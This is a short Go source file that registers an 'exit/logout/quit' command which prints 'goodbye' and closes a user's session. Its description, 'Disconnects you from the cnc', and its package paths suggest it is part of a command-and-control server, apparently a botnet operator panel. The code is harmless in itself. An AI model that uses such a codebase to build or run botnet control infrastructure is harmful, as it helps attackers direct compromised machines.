package all

import (
	"server/core/master/command"
	"server/core/master/session/sessions"
)

func init() {
	command.Make(&command.Command{
		Aliases:     []string{"exit", "logout", "quit"},
		Description: "Disconnects you from the cnc",
		Admin:       false,
		Executor: func(args []string, session *sessions.Session) {
			session.Println("goodbye")
			session.Close()
		},
	})
}
